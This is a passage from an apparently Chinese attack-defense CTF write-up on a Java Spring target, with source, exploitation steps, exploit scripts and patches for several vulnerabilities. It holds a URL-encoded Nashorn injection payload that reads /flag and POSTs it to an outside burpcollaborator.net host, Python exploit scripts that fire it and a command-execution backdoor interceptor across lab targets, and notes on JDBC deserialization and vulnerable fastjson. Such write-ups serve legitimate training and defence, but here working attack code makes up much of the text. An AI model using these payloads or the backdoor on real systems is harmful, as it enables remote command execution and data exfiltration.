/util/jsEngine?jsurl=nashorn:mozilla_compat.js%<span class="number">22</span>);%<span class="number">20</span>importPackage(java.lang);%<span class="number">20</span><span class="keyword">var</span>%<span class="number">20</span>x%<span class="number">20</span>=%<span class="number">20</span>Runtime.<span class="title function_ invoke__">getRuntime</span>();%<span class="number">20</span>importPackage(java.io.FileReader);%<span class="number">20</span>importPackage(java.io.BufferedReader);%<span class="number">20</span><span class="keyword">var</span>%<span class="number">20</span>file%<span class="number">20</span>=%<span class="number">20</span><span class="keyword">new</span>%<span class="number">20</span>java.io.<span class="title function_ invoke__">File</span>(%<span class="number">27</span>/flag%<span class="number">27</span>);<span class="keyword">var</span>%<span class="number">20</span>fileReader%<span class="number">20</span>=%<span class="number">20</span><span class="keyword">new</span>%<span class="number">20</span>java.io.<span class="title function_ invoke__">FileReader</span>(file);<span class="keyword">var</span>%<span class="number">20</span>bufferedReader%<span class="number">20</span>=%<span class="number">20</span><span class="keyword">new</span>%<span class="number">20</span>java.io.<span class="title function_ invoke__">BufferedReader</span>(fileReader);<span class="keyword">var</span>%<span class="number">20</span>flag%<span class="number">20</span>=%<span class="number">20</span>bufferedReader.<span class="title function_ invoke__">readLine</span>();<span class="title function_ invoke__">importPackage</span>(java.net);%<span class="number">20</span><span class="keyword">var</span>%<span class="number">20</span>url%<span class="number">20</span>=%<span class="number">20</span>%<span class="number">22</span>http:<span class="comment">//bxcl2ozhapx8lllzmp142n6ljcp2dr.burpcollaborator.net/%22;var%20obj%20=%20new%20URL(url);var%20con%20=%20obj.openConnection();con.setRequestMethod(%22POST%22);con.setRequestProperty(%22Content-Type%22,%20%22application/json%22);con.setRequestProperty(%22Authorization%22,%20%22xxx%22);con.setDoOutput(true);var%20wr%20=%20new%20java.io.DataOutputStream(con.getOutputStream());wr.writeBytes(%22%7B%27flag%27:%20%27%22%20%2B%20flag%20%2B%20%22%27%7D%22);wr.flush();wr.close();con.getResponseCode();(%22</span></span><br></pre></td></tr></table></figure><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">url</span>):</span><br><span class="line">    url = url + <span class="string">&#x27;/util/jsEngine?jsurl=nashorn:mozilla_compat.js%22);%20importPackage(java.lang);%20var%20x%20=%20Runtime.getRuntime();%20importPackage(java.io.FileReader);%20importPackage(java.io.BufferedReader);%20var%20file%20=%20new%20java.io.File(%27/flag%27);var%20fileReader%20=%20new%20java.io.FileReader(file);var%20bufferedReader%20=%20new%20java.io.BufferedReader(fileReader);var%20flag%20=%20bufferedReader.readLine();importPackage(java.net);%20var%20url%20=%20%22http://bxcl2ozhapx8lllzmp142n6ljcp2dr.burpcollaborator.net/%22;var%20obj%20=%20new%20URL(url);var%20con%20=%20obj.openConnection();con.setRequestMethod(%22POST%22);con.setRequestProperty(%22Content-Type%22,%20%22application/json%22);con.setRequestProperty(%22Authorization%22,%20%22xxx%22);con.setDoOutput(true);var%20wr%20=%20new%20java.io.DataOutputStream(con.getOutputStream());wr.writeBytes(%22%7B%27flag%27:%20%27%22%20%2B%20flag%20%2B%20%22%27%7D%22);wr.flush();wr.close();con.getResponseCode();(%22&#x27;</span></span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">        response = requests.get(url=url, headers=headers, data=data, proxies=proxies)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] &quot;</span> + url + <span class="string">&quot; connect shell failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag(<span class="string">&#x27;http://127.0.0.1:10180/&#x27;</span>)</span><br><span class="line">    <span class="comment"># count = 1</span></span><br><span class="line">    <span class="comment"># while 1:</span></span><br><span class="line">        <span class="comment"># print(f&quot;==========第&#123;count&#125;轮提交=========&quot;)</span></span><br><span class="line">        <span class="comment"># count = 10180</span></span><br><span class="line">        <span class="comment"># for i in range(1, 81):</span></span><br><span class="line">            <span class="comment"># url 为靶机ip</span></span><br><span class="line">            <span class="comment"># uri = f&#x27;http://192.168.70.12:&#123;count&#125;/&#x27;</span></span><br><span class="line">            <span class="comment"># print(f&quot;==========第&#123;i&#125;号靶机===========&quot;)</span></span><br><span class="line">            <span class="comment"># get_flag1(uri)</span></span><br><span class="line">            <span class="comment"># count += 100</span></span><br><span class="line">        <span class="comment"># time.sleep(300) </span></span><br></pre></td></tr></table></figure><h3 id="patch-4"><a href="#patch-4" class="headerlink" title="patch"></a>patch</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&#123;&quot;/jsEngine&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> Map <span class="title function_">jsEngine</span><span class="params">(String jsurl)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">Map</span> <span class="variable">jsStatus</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">jsStatus.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;jsEngine is ready&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> jsStatus;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h3><p>&#x2F;init 接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@EnableAutoConfiguration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InitController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/init&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">escape</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">abstractHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Object i : adaptedInterceptors) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i.getClass().getName().contains(<span class="string">&quot;EscapeUtil&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        adaptedInterceptors.add(<span class="keyword">new</span> <span class="title class_">Exit</span>.EscapeUtil());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;util&#x2F;EscapeUtil</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EscapeUtil</span>  <span class="keyword">extends</span> <span class="title class_">HandlerInterceptorAdapter</span> &#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">           <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;nbl&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;nbl&quot;</span>);</span><br><span class="line">               Process process;</span><br><span class="line">               process = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class="line"></span><br><span class="line">               <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">               <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">               String line;</span><br><span class="line">               <span class="keyword">while</span>((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                   stringBuilder.append(line + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               response.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">               response.getOutputStream().flush();</span><br><span class="line">               response.getOutputStream().close();</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问&#x2F;init后加载拦截器实例化EscapeUtil访问任意接口提交nbl参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http request</span><br><span class="line">GET /init/</span><br><span class="line">GET /init?nbl=cat%<span class="number">20</span>/flag</span><br><span class="line">GET /util/image?nbl=cat%<span class="number">20</span>/flag</span><br><span class="line">GET /util/json?nbl=cat%<span class="number">20</span>/flag</span><br><span class="line">GET /util/apiTest?nbl=cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">count1 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_flag</span>(<span class="params">flag</span>):</span><br><span class="line">    url = <span class="string">f&#x27;http://xxxx/api/flag&#x27;</span></span><br><span class="line">    proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>: flag</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url,</span><br><span class="line">                        headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;xxxx&quot;</span>&#125;,</span><br><span class="line">                        proxies=proxies,</span><br><span class="line">                        data=json.dumps(data))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">global</span> count1</span><br><span class="line">        count1 += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag1</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url1 = url + <span class="string">&#x27;init/&#x27;</span></span><br><span class="line">        url2 = url + <span class="string">&#x27;init/?nbl=cat%20/flag&#x27;</span></span><br><span class="line">        url3 = url + <span class="string">&#x27;util/image?nbl=cat%20/flag&#x27;</span></span><br><span class="line">        url4 = url + <span class="string">&#x27;util/json?nbl=cat%20/flag&#x27;</span></span><br><span class="line">        url5 = url + <span class="string">&#x27;util/apiTest?nbl=cat%20/flag&#x27;</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">        proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">        response1 = requests.get(url=url1, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        response1 = requests.get(url=url1, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        response2 = requests.get(url=url2, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        <span class="built_in">print</span>(response2.text)</span><br><span class="line">        submit_flag(response2.text)</span><br><span class="line">        response3 = requests.get(url=url3, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        <span class="built_in">print</span>(response3.text)</span><br><span class="line">        submit_flag(response3.text)</span><br><span class="line">        response4 = requests.get(url=url4, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        <span class="built_in">print</span>(response4.text)</span><br><span class="line">        submit_flag(response4.text)</span><br><span class="line">        response5 = requests.get(url=url5, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        <span class="built_in">print</span>(response5.text)</span><br><span class="line">        submit_flag(response5.text)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] &quot;</span> + url + <span class="string">&quot; connect shell failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag1(<span class="string">&quot;http://127.0.0.1:10180/&quot;</span>)</span><br><span class="line">    <span class="comment"># count = 1</span></span><br><span class="line">    <span class="comment"># while 1:</span></span><br><span class="line">    <span class="comment">#     print(f&quot;==========第&#123;count&#125;轮提交=========&quot;)</span></span><br><span class="line">    <span class="comment">#     count = 10180</span></span><br><span class="line">    <span class="comment">#     # count = 14680</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#     for i in range(1, 59):</span></span><br><span class="line">    <span class="comment">#         # url 为靶机ip</span></span><br><span class="line">    <span class="comment">#         uri = f&#x27;http://192.168.70.12:&#123;count&#125;/&#x27;</span></span><br><span class="line">    <span class="comment">#         print(f&quot;==========第&#123;i&#125;号靶机===========&quot;)</span></span><br><span class="line">    <span class="comment">#         get_flag1(uri)</span></span><br><span class="line">    <span class="comment">#         get_flag1(uri)</span></span><br><span class="line">    <span class="comment">#         get_flag1(uri)</span></span><br><span class="line">    <span class="comment">#         count += 100</span></span><br><span class="line">    <span class="comment">#     print(&quot;[+]Get flag count &#123;&#125;&quot;.format(count1))</span></span><br><span class="line">    <span class="comment">#     count1 = 0</span></span><br><span class="line">    <span class="comment">#     time.sleep(300) </span></span><br></pre></td></tr></table></figure><h3 id="patch-5"><a href="#patch-5" class="headerlink" title="patch"></a>patch</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EscapeUtil</span> <span class="keyword">extends</span> <span class="title class_">HandlerInterceptorAdapter</span> &#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="title function_">EscapeUtil</span><span class="params">()</span> &#123;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">           <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;nbl&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;nbl&quot;</span>);</span><br><span class="line">               response.getOutputStream().write(<span class="string">&quot;dont&quot;</span>.getBytes());</span><br><span class="line">               response.getOutputStream().flush();</span><br><span class="line">               response.getOutputStream().close();</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><h3 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DatabaseController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/database/connect&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">mysql</span><span class="params">(<span class="meta">@RequestParam</span> String ip, <span class="meta">@RequestParam</span> String port, <span class="meta">@RequestParam</span> String database, <span class="meta">@RequestParam</span> String username, <span class="meta">@RequestParam</span> String password)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> String.format(<span class="string">&quot;jdbc:mysql://%s:%s/%s?useSSL=false&quot;</span>, ip, port, database);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, username, password);</span><br><span class="line">            <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select &#x27;ok&#x27;&quot;</span>;</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line">            <span class="keyword">if</span> (rs.next()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;ok&quot;</span>.equals(rs.getString(<span class="number">1</span>).toString())) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;connect success, &quot;</span> + url;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;connect error, &quot;</span> + url;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>&#x2F;database&#x2F;connect mysql jdbc反序列化</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><p>暂无</p><h3 id="patch-6"><a href="#patch-6" class="headerlink" title="patch"></a>patch</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(<span class="params">&#123;<span class="string">&quot;/database/connect&quot;</span>&#125;</span>)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line">public Object mysql(@RequestParam String ip, @RequestParam String port, @RequestParam String database, @RequestParam String username, @RequestParam String password) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;connect success, jdbc:mysql://127.0.0.1:3306/admin?useSSL=false&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><h3 id="源码-7"><a href="#源码-7" class="headerlink" title="源码"></a>源码</h3><p>无</p><h3 id="漏洞利用-7"><a href="#漏洞利用-7" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>&#x2F;json 接口结合有漏洞的 log4j，fastjson，commons 第三方组件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/json&quot;)</span></span><br><span class="line">   <span class="meta">@ResponseBody</span></span><br><span class="line">   <span class="keyword">public</span> Object <span class="title function_">json</span><span class="params">(<span class="meta">@RequestBody</span> Object test)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="keyword">return</span> test;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><p>暂无</p><h3 id="patch-7"><a href="#patch-7" class="headerlink" title="patch"></a>patch</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最简单的办法，直接maven获取最新版本，打包jar成第一个版本</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-lang3<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.12.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.30<span class="tag">&lt;/<span 